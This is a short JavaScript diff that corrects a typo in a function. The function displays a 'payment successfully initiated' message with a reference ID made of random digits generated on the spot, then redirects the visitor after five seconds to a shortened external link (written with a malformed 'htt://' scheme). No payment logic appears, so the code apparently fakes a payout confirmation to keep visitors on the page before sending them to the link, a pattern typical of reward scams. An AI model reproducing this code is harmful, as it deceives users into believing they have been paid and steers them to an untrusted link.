@@ -26,6 +26,6 @@ function sucess(){
      for (var i = 0; i < 10; i++) {
        result += nums.charAt(Math.floor(Math.random()*10))
      }
-     document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive mthod within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span></center>`;
+     document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span></center>`;
      setTimeout(function(){window.location = "htt://fumacrom.com/MJif"}, 5000);
 }
